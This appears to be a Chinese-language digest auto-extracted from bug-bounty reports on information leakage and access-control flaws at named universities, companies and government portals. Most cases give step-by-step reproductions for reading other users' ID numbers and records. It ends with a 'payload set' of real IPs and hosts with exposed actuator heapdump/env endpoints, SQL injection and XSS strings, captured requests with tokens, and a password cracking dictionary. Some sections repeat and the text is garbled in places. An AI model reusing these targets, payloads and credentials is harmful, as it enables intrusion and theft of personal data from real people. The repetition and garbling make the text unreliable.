# SRC 实战报告提炼 — info_leak

> 来源：蚂蚁SRC榜一Clown的 100 份实战报告
> 提取时间：2026-09-14

## 典型案例摘要（20 份）

### SRC挖洞思路

--面向企业src的漏洞挖掘 从0到1，发现与拓展攻 击面 Speaker name：羽 Date：2019/04/19 01子域名枚举、端口扫描、路径扫描、旁站c段查询 常规性资产收集 02关注页面内容、关注目录、敏感关键字搜索 巧用搜索引擎 03构造接口、构造文件、构造目录、框架搭配 发挥创造性思维 04微信公众号、小程序 关注企业动态 05gayhub搜索、漏洞回挖、假性社工 其他tips 06从一个文件服务器静态资源泄露引发的血案 综合案例 content 常规性资产收集 基本的资产收集方式：子域名枚举、端口扫描、路径 扫描、旁站c段查询 子域名枚举 4 子域名爆破：sublist3r

### 支付原理与案例

快便支付原理 商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知 	浏览器跳转 		基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面， 		并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知， 		导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性 	服务器端异步通知 该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接收异部参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常

### github信息收集

介绍: 在漏洞挖掘的过程前期我们进行信息收集，github和码云搜索相关的信息，代码库，运气好的话可以在库中发现一些重要配置如数据库用户密码等 手工方法 gtihub搜索语法: in:name baidu              #标题搜索含有关键字baidu in:descripton baidu         #仓库描述搜索含有关键字 in:readme baidu             #Readme文件搜素含有关键字 stars:>3000 baidu           #stars数量大于3000的搜索关键字 stars:1000..3000 baidu      #star

### 第二更：信息收集

信息收集   对于我们在挖edusrc的时候遇见最大的问题就是如何突破一站式服务大厅的网站，要突破这一点，我们就需要拥有教师的gh 、sfz和 学生的sfz、 xh这些个人隐私信息，所以我们就需要做好信息收集： 利用好谷歌语法查找敏感信息：  site:xxx.edu.cn   这个语句是寻找这个学校的相关域名的站点，但是在这个后面加一些敏感信息就可以指定查找了，比如：site:xxx.edu.cn  sfz      site:xxx.edu.cn  xh  这样的等条件  如上图一样，直接可以从这个pdf中获取很多信息，一般隐私信息都会以doc pdf xls 这些文件发布到网上，所以造成

### [忽略]麦当劳名下子公司存在信息泄露

SRC-2022-413 | 麦当劳名下子公司存在信息泄露 处理进度 审核中 已确认 已修复 已忽略 基本信息 提交时间：2022-01-25 17:33:55 漏洞类型：默认分类 危害等级评定：无影响  安全币评定：评定中 漏洞详情 信息泄露url： https://m.combofin.com/robots.txt

### 国家市场监督管理总局存在权限认证缺陷

国家市场监督管理总局存在权限认证缺陷 地址: http://ltb.samr.gov.cn:81/#/ 访问会提示未登录, 用开发者工具删除这个提示即可绕过 删除掉这个两个标签 绕过后, 点击其他菜单/系统管理 前台用户处, 看流量包, 发现泄露敏感信息 泄露手机号和密码和盐, 这里删掉参数可以返回所有条 1145 其他菜单的党费明细, 历史包中泄露敏感信息 泄露老干部身份证号, 这里也删掉参数返回所有数据 482

### 上海交大越权

用模拟器登录此交大就业（电脑vx登录为交大就业新版本，只能用模拟器进行复现） 使用账号密码登录成功 点击首页 在点击前开启抓包拦截 修改第一个跟第二个包的qxid值，可以达到越权效果 原来的包 修改之后的 WGSp3U4TuVwuAoSCSTsQjd 修改第二个包 回显信息为另一学生的敏感信息

### 支付原理与案例

快便支付原理 商户网站接入支付结果有两种方式，一种是通过浏览器进行跳转通知，一种是服务器端异步通知 	浏览器跳转 		基于用户访问的浏览器，如果用户在银行页面支付成功后，直接关闭了页面， 		并未等待银行跳转到支付结果页面，那么商户网站就收不到支付结果的通知， 		导致支付结果难以处理。而且浏览器端数据很容易被篡改而降低安全性 	服务器端异步通知 该方式是支付公司服务器后台直接向用户指定的异步通知URL发送参数，采用POST或GET的方式。商户网站接收异部参数的URL对应的程序中，要对支付公司返回的支付结果进行签名验证，成功后进行支付逻辑处理，如验证金额、订单信息是否与发起支付时一致，验证正常

### 贵州电网heapdump泄露

heapdump泄露 资产关联性: 地址: http://119.23.19.84:9001//actuator/heapdump 将次文件下载，使用heapdump_tool.jar对其内容进行查找 找到redis数据库的连接密码和host信息 任意文件下载 漏洞地址： https://admin.charge.gapsd.com/api/account/shop/download/?Access-token=<REDACTED> 过程及证明截图: XSS跨站脚本攻击 ①xss 漏洞地址: https://admin.charge.gapsd.com/ap

### 广西师范大学逻辑缺陷

漏洞地址 https://gxsdxyy.gxnu.edu.cn/#/pages/login/index 随意输入身份证抓包 发送到repeat，在ylzh参数传入学号，即可获取到敏感信息 根据获取得身份证成功登录系统

### PSRC小目标，挣他一个亿

PSRC小目标，挣他一个亿 讲师：carry_your 138,270,000  CONTENTS 01 资产收集技巧 02 漏洞挖掘案例 03 职业规划梳理 资产收集 1 在渗透测试中，我们需要尽可能多 的去收集目标的信息，资产探测和 信息收集，决定了你发现安全漏洞 的几率有多大。如何最大化的去收 集目标范围，尽可能的收集到子域 名及相关域名的信息，这对我们进 一步的渗透测试显得尤为重要。 基本概况 IP段+端 口 域名 APP 服务号API 信息泄露 社工 基本概况 股权结构查询 大型金融集团往往有着非常复 杂的股权结构，通过工商查询 目标集团的股权结构，更全面 的了解目标集团的公司资产，

### 陕西学前越权

人事 -> 我的卡片 -> 个人信息，可以查看到自己的身份证号 通讯录可以看到约1.5w条师生个人信息，直接点击姓名进行访问（这里以付建成为例） 可以正常访问其基本信息，但并不包含身份证等敏感信息，当然，这很合理 不过仔细对比发现，个人卡片的身份证信息在“个人信息”模块，而不是”基本信息“模块； 而他人卡片并不存在“个人信息”模块； 对比两个模块的URL路径，发现个人信息模块路径含“/cardPersonal/”， 而基本信息模块与之对应的路径是“/cardinfo/”； 直接将他人卡片URL路径中的“/cardinfo/”替换成“/cardPersonal/”新建标签页（这点很重要）访问； 

### 渗透字典

huangyu888!@#$zhoujiakui 223223 jtserver1981@223 wztelecom2008easyget yzdx123 echina0228 xiaxue123-$$ 4rf7uj3ed8ik !!changeme$$ ebochai517 qifengjc09001. 1qa2ws3ed wzcgame12 wanzhonggame wanzhonggame12!#13 xpmiripserczmir3 xpmiripserczmir123 joyidc0980 cdq238888 2819327oyxh qingtian1668 popmusic789 

### 指挥调度中心-未授权访问漏洞3

福建科立讯通信有限公司指挥调度管理平台存在未授权访问漏洞 漏洞描述 福建科立讯通信有限公司创立于2001年，是以专业通信为核心的解决方案提供商和运营服务商。 福建科立讯通信有限公司指挥调度管理平台存在未授权访问漏洞。攻击者可利用漏洞未授权获取服务器敏感信息。 二、漏洞影响 指挥调度管理平台 三、漏洞复现 复现一 1、fafo搜索：app="指挥调度管理平台" 2、以IP：http://119.23.41.154为例 账号，密码：admin/admin 3、进入到系统后，如图，点击IMEI管理，再点击导入，下载execl模板，抓包 4、复制下载链接，更换浏览器进行访问，成功未授权下载文件  复现

### 去哪儿信息泄露

一、详细说明：包括场景、截图、漏洞重现的方法，涉及账号相关漏洞，请提供 测试账号，若复现过程复杂，可录制视频，上传至云盘，附链接。 访问：https://hao123.train.qunar.com/build.xml 泄露数据库账号密码，等敏感信息 二、漏洞证明（在这里写POC） 三、修复方案： Firefox https://www.huoxian.cn/layman/leak/detail/7273 第1页 共2页 2022/4/6 15:48 Firefox https://www.huoxian.cn/layman/leak/detail/7273 第2页 共2页 2022/4/6 

### 浙江大学-存在逻辑缺陷

浙江大学微纳公共平台存在逻辑缺陷，可越权访问其他用户敏感信息 URL：https://nano.intl.zju.edu.cn/login.aspx 202103120201 / 123456 登陆后在个人中心可查看个人信息 开启bp拦截，刷新页面，修改webUserName（用户名）参数，可越权查看其他用户个人敏感信息 这里将202103120201改为202103120202 成功越权

### 面向企业src的漏洞挖掘

--面向企业src的漏洞挖掘 从0到1，发现与拓展攻 击面 Speaker name：羽 Date：2019/04/19 01子域名枚举、端口扫描、路径扫描、旁站c段查询 常规性资产收集 02关注页面内容、关注目录、敏感关键字搜索 巧用搜索引擎 03构造接口、构造文件、构造目录、框架搭配 发挥创造性思维 04微信公众号、小程序 关注企业动态 05gayhub搜索、漏洞回挖、假性社工 其他tips 06从一个文件服务器静态资源泄露引发的血案 综合案例 content 常规性资产收集 基本的资产收集方式：子域名枚举、端口扫描、路径 扫描、旁站c段查询 子域名枚举 4 子域名爆破：sublist3r

### 亳州学院-存在越权（已看）

亳州学院信息门户存在逻辑缺陷，可越权访问他人流程信息 URL：https://oshall.bzuu.edu.cn/zhxy/home 开启bp代理，点击服务视图 在历史包的响应包中可看到如下数据包，注意这里的id参数 在办事服务中选择一个流程进行办理（数据输入随意） 在事务中心，我的申请中先进行搜索，开启bp拦截，再点击查看，将数据包发送到重发模块 这里原本可以看到自己的流程信息 更改applyId为前文提到的id参数，可以访问到其他用户的流程信息，其中包括用户身份证等敏感信息 这里尝试修改为e1693acb5f0d4eaeafb0641ab4e9decb

### 广西民族大学

漏洞url:https://cas.gxun.edu.cn/lyuapServer/login  账号117293010120，密码123.com.. 广西民族大学 | 教育漏洞报告平台 https://src.sjtu.edu.cn/post/147573/ 第1页 共3页 2023/1/3 9:38 采用base64加密，试着用其他学号，加密以后，替换了 广西民族大学 | 教育漏洞报告平台 第2页 共3页 2023/1/3 9:38 成功越权下载文件，可以利用此方法大量获取到学生的个人敏感信息 广西民族大学 | 教育漏洞报告平台 https://src.sjtu.edu.cn/post/1

### [低危]麦当劳etraining存在信息泄露

SRC-2022-142 | 麦当劳etraining存在信息泄露 处理进度 审核中 已确认 已修复 完成 基本信息 提交时间：2022-01-22 22:37:36 漏洞类型：Web漏洞 危害等级评定：低危  安全币评定：+积分:2 +安全币:20 漏洞详情 信息泄露位置：https://etraining.mcd.com.cn:5501/js/Data.js 把乱码文件转码即可看见泄露信息

## 实战 Payload 集（46 条去重）

### URL

```
https://docs.github.com/en/search-github/searching-on-github/searching-for-repositories
http://119.23.19.84:9001//actuator/heapdump
https://dev.etaisoft.com/api/actuator/env
https://dev.etaisoft.com/api/actuator/heapdump
https://demo.huatengkz.com/api/actuator/env
https://demo.huatengkz.com/api/actuator/heapdump
http://222.240.1.5:8190/api/actuator/env
http://222.240.1.5:8190/api/actuator/heapdump
http://112.111.28.148:6969/api/actuator/env
http://112.111.28.148:6969/api/actuator/heapdump
http://47.122.57.88:6969/api/actuator/env
http://47.122.57.88:6969/api/actuator/heapdump
http://110.83.230.27:6969/api/actuator/env
http://110.83.230.27:6969/api/actuator/heapdump
http://fjvims.fjwanfu.com:13084/api/actuator/env
```

### XSS

```
<script>alert(/xss/)</script>
javascript://
ontent="text/html;
javascript:;
```

### HTTP请求

```
POST /xxxxxx/app.do HTTP/1.1
Host: gw.xxxxxx.com
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Cookie: BIGipServer_nginx_pool=926027948.36895.0000
Connection: close
Accept: */*
User-Agent: XXXX2B/1.8.1 (iPhone; iOS 10.3.1; Scale/2.00)
Accept-Language: zh-Hans-CN;q=1
Content-Length: 318
X-Request-Id: 9F613F2C-29D0-44F3-95BB-011FAA7577B8
a p p S r c = 3 & a p p T y p e = B & a p p _ c o d e = 2 3 0 0 4 & c a s U u i d = 1 & c l i n i c I d = f 4 e 3 5 0 c 7 - 7 8 f
POST /ccc-cmnsrv-channel-channelapp/order/prejud/queryUser HTTP/1.1
Host: flsccc.cccc.com.cn
Accept: */*
version: 1
userId: 2b9a0888-18b6-4790-838a-fe7dea4d865f_8348
Accept-Encoding: br, gzip, deflate
Accept-Language: zh-Hans-CN;q=1
token: 
<REDACTED>
mI5YTA4ODgtMThiNi00NzkwLTgzOGEtZmU3ZGVhNGQ4NjVmXzgzNDgiLCJkZXZpY2VJZCI6IjkyQjExNTgwLUJDM
TEtNDBGQS1CRjFCLUJBM0EyQkQ1RkJCNCJ9.zYzs8nKtmM8gxK8Qz3zvh-i85Z5K641jkaV40l5
POST /ccc-cmnsrv-channel-channelapp//order/prejud/querydetail HTTP/1.1
Host: ccc.ccc.com.cn
Accept: */*
version: 1
userId: 2b9a0888-18b6-4790-838a-fe7dea4d865f_8348
Accept-Encoding: br, gzip, deflate
Accept-Language: zh-Hans-CN;q=1
t o k e n : 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJhdXRoMCIsImV4cCI6MTUzODM5NjAxMywidXNlcklkIjoiMmI5Y
TA4ODgtMThiNi00NzkwLTgzOGEtZmU3ZGVhNGQ4NjVmXzgzNDgiLCJkZXZpY2VJZCI6IjkyQjExNTgwLUJDMTEtNDB
GQS1CRjFCLUJBM0EyQkQ1RkJCNCJ9.zYzs8nKtmM8gxK8Qz3zvh-i85Z5K641jkaV
GET /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1} HTTP/1.1
Connection: close
Accept-Encoding: gzip
```
```

### SQL

```
and 1=1 正常回显
and 1=0 错误回显
load_file()读取本地文件
or 1=1 恒为真时，返回全部数据，包括身份证，电话，住址等等。
updatexml(1,concat(0x7e,(select database()),0x7e),1)) -- q
or 1=1 并
or 1=1   就能绕过校验，成功获取所有user数据。
or 1=1 and password/text()=
or
1=1]。
or 1=1并在password中输入：
or 1=1就能绕过校
or 1=1]。
```

## 技术手法统计

- 提权: 24 次
- 漏洞利用: 9 次
- 漏洞链: 3 次
- 枚举/爆破: 2 次
- 参数篡改: 2 次
- 接口发现: 2 次
- WAF/过滤绕过: 1 次

